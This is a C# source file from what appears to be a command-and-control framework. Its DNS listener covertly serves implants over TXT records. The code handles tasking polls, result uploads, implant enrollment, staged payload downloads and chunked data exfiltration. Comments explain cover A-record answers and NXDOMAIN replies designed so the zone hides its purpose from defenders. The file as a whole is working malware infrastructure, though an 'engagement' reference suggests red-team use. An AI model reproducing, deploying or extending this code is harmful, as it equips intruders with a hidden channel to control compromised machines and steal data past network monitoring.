using Microsoft.Extensions.Logging;

namespace Rod.Transport.Listeners.Dns;

// The DNS contact answer core (architecture.md Sec 8), shared by the two
// carriages that speak the DNS grammar: the UDP listener's datagrams and
// the DoH route's HTTP bodies (RFC 8484). The wire grammar lives in
// DnsContactNames and the contract doc; the tasking/presence composition
// lives in DnsBeaconBridge. The carriage changes; the answer never does.

/// <summary>
/// Answers one DNS wire query under a zone: a poll, result chunk, or
/// enrollment exchange under the zone gets the contact treatment; an A
/// query under the zone resolves to the cover address (a zone that
/// answered TXT for random labels but NXDOMAIN for every A query would
/// read as a TXT-only oddity -- an ordinary v4 zone answers its A records,
/// so this one does too); anything else in the zone is NXDOMAIN, the shape
/// a resolver expects for an unknown name, so the zone does not advertise
/// what it is; a query for another zone entirely is REFUSED (rcode 5) --
/// this listener is not an open resolver.
/// </summary>
internal sealed class DnsContactAnswerer
{
    private readonly string _zone;
    private readonly DnsBeaconBridge _bridge;
    private readonly ILogger _logger;
    private readonly Rod.Transport.Listeners.Listener _listener;

    // The address the zone's A queries resolve to: the bind's own host when
    // it is a concrete address (the factually correct "where this zone
    // lives"), else a deterministic per-name address in 198.18.0.0/15 -- a
    // wildcard bind names no single host, and a benchmark-range address
    // points nowhere while reading as an ordinary record.
    private readonly System.Net.IPAddress? _coverHost;

    public DnsContactAnswerer(
        Rod.Transport.Listeners.Listener listener, DnsBeaconBridge bridge, ILogger logger)
    {
        _zone = listener.PublicEndpoint.TrimEnd('.').ToLowerInvariant();
        _bridge = bridge;
        _logger = logger;
        _listener = listener;
        _coverHost = TryParseConcreteBindHost(listener.BindAddress);
    }

    /// <summary>
    /// Builds the response wire message for one query. Fully async: the
    /// bridge calls (a task claim, an audit append) are awaited, never
    /// blocked on -- a blocked answer thread is a thread pool thread, and
    /// enough of those is exactly the starvation the Kestrel heartbeat
    /// warns about.
    /// </summary>
    public async Task<byte[]> AnswerAsync(byte[] query, CancellationToken cancellationToken)
    {
        var parsed = DnsCodec.ParseQuery(query);
        if (parsed?.Question is not { } question)
            return EmptyResponse(parsed?.Id ?? 0, responseCode: 1); // FORMERR

        var name = question.Name.ToLowerInvariant();

        // Only our zone; no recursion, no other zones.
        if (!name.EndsWith(_zone, StringComparison.Ordinal))
            return EmptyResponse(parsed.Id, responseCode: 5); // REFUSED: not our zone

        // The cover: an A query anywhere in the zone resolves, the shape an
        // ordinary v4 zone's answer section takes. Contact names answer the
        // cover too -- the TXT answer is the only channel that carries
        // contact data, and it answers below.
        if (question.Type == DnsCodec.AType)
        {
            var cover = new DnsMessage
            {
                Id = parsed.Id,
                IsResponse = true,
                Question = question,
                ResponseCode = 0,
            };
            cover.AAnswers.Add(new DnsAAnswer(name, CoverAddressFor(name)));
            return DnsCodec.EncodeResponse(cover);
        }

        if (question.Type != DnsCodec.TxtType)
            return EmptyResponse(parsed.Id, responseCode: 3); // NXDOMAIN: TXT (or A) only

        var response = new DnsMessage
        {
            Id = parsed.Id,
            IsResponse = true,
            Question = question,
            ResponseCode = 0,
        };

        try
        {
            if (DnsContactNames.TryParseSealedPoll(name, _zone) is { } sealedPoll)
            {
                // The sealed carriage's poll: the key id in the name resolves
                // the answer's seal. The TXT payload is base32 like every
                // other answer -- of the raw R1 body, not the kind-prefixed
                // plaintext.
                var sealedAnswer = await _bridge.PollAsync(sealedPoll.Implant, sealedPoll.KeyId, cancellationToken);
                if (sealedAnswer is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(sealedAnswer)));
            }
            else if (DnsContactNames.TryParsePoll(name, _zone) is { } poll)
            {
                var marshaled = await _bridge.PollAsync(poll.Implant, cancellationToken);
                if (marshaled is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(marshaled)));
            }
            else if (DnsContactNames.TryParseResult(name, _zone) is { } chunk)
            {
                await _bridge.ResultChunkAsync(
                    chunk.Implant, chunk.Task, chunk.Outcome, chunk.Sequence, chunk.Terminal, chunk.Chunk,
                    cancellationToken);
            }
            else if (DnsContactNames.TryParseChannel(name, _zone) is { } output)
            {
                await _bridge.ChannelChunkAsync(
                    output.Implant, output.Task, output.Sequence, output.Terminal, output.Chunk,
                    cancellationToken);
            }
            else if (DnsContactNames.TryParseEnroll(name, _zone) is { } enroll)
            {
                // The enrollment exchange (Sec 8): scoped by this listener's
                // own engagement, the same rule every ingress follows. The
                // ack text rides base32-wrapped like every TXT answer this
                // grammar carries.
                var ack = await _bridge.EnrollChunkAsync(
                    _listener, enroll.Stream, enroll.Sequence, enroll.Terminal, enroll.Chunk, cancellationToken);
                if (ack is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(ack)));
                else
                    response.ResponseCode = 3; // malformed shape: in-zone, unanswered
            }
            else if (DnsContactNames.TryParseEnrollAnswer(name, _zone) is { } probe)
            {
                var part = await _bridge.EnrollAnswerAsync(probe.Token, probe.Sequence);
                if (part is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(part)));
                else
                    response.ResponseCode = 3; // unknown or expired token
            }
            else if (DnsContactNames.TryParseStaged(name, _zone) is { } demand)
            {
                // The staged arm's demand (ADR-010): the answer names a
                // token-keyed chunked download, base32-wrapped like every
                // TXT answer this grammar carries. A demand this listener
                // cannot serve answers nothing.
                var token = await _bridge.StagedDemandAsync(
                    demand.Implant, demand.Task, demand.Offset, demand.PrefixSha, cancellationToken);
                if (token is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(token)));
            }
            else if (DnsContactNames.TryParseStagedDownload(name, _zone) is { } download)
            {
                var part = await _bridge.StagedDownloadAsync(download.Token, download.Sequence);
                if (part is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(part)));
                else
                    response.ResponseCode = 3; // unknown or expired token
            }
            else if (DnsContactNames.TryParseDelivery(name, _zone) is { } delivery)
            {
                // The retransmission half's confirmation: y once the exact
                // blob landed, n while it has not -- the TXT payload rides
                // base32 like every answer this grammar carries.
                var landed = _bridge.DeliveryConfirmed(delivery.Task, delivery.Sha);
                response.Answers.Add(TxtAnswer(
                    name, DnsContactNames.Encode(new[] { (byte)(landed ? 'y' : 'n') })));
            }
            else if (DnsContactNames.TryParseExfilSeam(name, _zone) is { } seam)
            {
                // The upload arm's seam probe (ADR-010): the decimal held
                // count of the named run, base32-wrapped like every answer
                // this grammar carries.
                var held = await _bridge.ExfilSeamAsync(seam.Implant, seam.Task, seam.NameSha, cancellationToken);
                if (held is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(held)));
            }
            else if (DnsContactNames.TryParseExfilUpload(name, _zone) is { } upload)
            {
                // The upload arm's sealed blob exchange: "+" while the
                // stream assembles, on the terminal blob's placement too.
                // A stream this listener cannot serve (broken sequence,
                // cap overflow, an unsealable blob) answers nothing.
                var ack = await _bridge.ExfilUploadChunkAsync(
                    upload.Implant, upload.Stream, upload.Sequence, upload.Terminal, upload.Chunk,
                    cancellationToken);
                if (ack is not null)
                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(ack)));
            }
            else
            {
                response.ResponseCode = 3; // NXDOMAIN: in-zone but not a contact
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "DNS listener {Name} failed a contact for {Question}.", _listener.Name, question.Name);
            return EmptyResponse(parsed.Id, responseCode: 2); // SERVFAIL
        }

        return DnsCodec.EncodeResponse(response);
    }

    private static DnsTxtAnswer TxtAnswer(string name, string encoded)
    {
        // Split the base32 payload into TXT strings of at most 200 chars: the
        // record's strings concatenate back into one payload on the implant
        // side, and the split keeps any single string well under the 255-byte
        // TXT limit with the EDNS0 budget in mind.
        var strings = new List<string>();
        for (var offset = 0; offset < encoded.Length; offset += 200)
            strings.Add(encoded.Substring(offset, Math.Min(200, encoded.Length - offset)));
        return new DnsTxtAnswer(name, strings);
    }

    private static byte[] EmptyResponse(ushort id, ushort responseCode)
        => DnsCodec.EncodeResponse(new DnsMessage { Id = id, IsResponse = true, ResponseCode = responseCode });

    /// <summary>
    /// The cover address one name resolves to: the bind's own host when the
    /// bind is concrete, else a deterministic hash of the name inside
    /// 198.18.0.0/15 (RFC 2544's benchmark space -- reserved, unroutable, and
    /// shaped like any other record). Deterministic so repeated queries for
    /// one name agree, the behavior resolvers cache by.
    /// </summary>
    private System.Net.IPAddress CoverAddressFor(string name)
    {
        if (_coverHost is { } host)
            return host;
        var hash = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.ASCII.GetBytes(name));
        // 198.18.0.0/15 spans 198.18.x.x and 198.19.x.x: one hash bit picks
        // between the two, the rest spread over the low octets.
        var low = (ushort)((hash[0] << 8) | hash[1]);
        return new System.Net.IPAddress(new byte[] { 198, (byte)(0x12 | ((low & 0x0100) >> 8)), (byte)(low >> 8), (byte)low });
    }

    // The bind's host when it names a concrete address an A record can
    // carry (v4, or v4-mapped v6); null for the wildcard shapes, loopback
    // v6, and any bind a genuine v6 address names -- those take the
    // deterministic cover, since no honest v4 record exists for them.
    private static System.Net.IPAddress? TryParseConcreteBindHost(string bindAddress)
    {
        var span = bindAddress.AsSpan().Trim();
        if (span.StartsWith('['))
        {
            var end = span.IndexOf(']');
            if (end > 1 && System.Net.IPAddress.TryParse(span[1..end], out var v6))
            {
                var bytes = v6.GetAddressBytes();
                if (bytes.Length == 16
                    && bytes.AsSpan(0, 10).SequenceEqual(stackalloc byte[10])
                    && bytes[10] == 0xFF && bytes[11] == 0xFF)
                    return new System.Net.IPAddress(bytes[12..]);
            }
            return null;
        }
        var colon = span.LastIndexOf(':');
        var host = colon > 0 ? span[..colon] : span;
        if (System.Net.IPAddress.TryParse(host, out var parsed)
            && parsed.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
            && !parsed.Equals(System.Net.IPAddress.Any))
            return parsed;
        return null;
    }
}
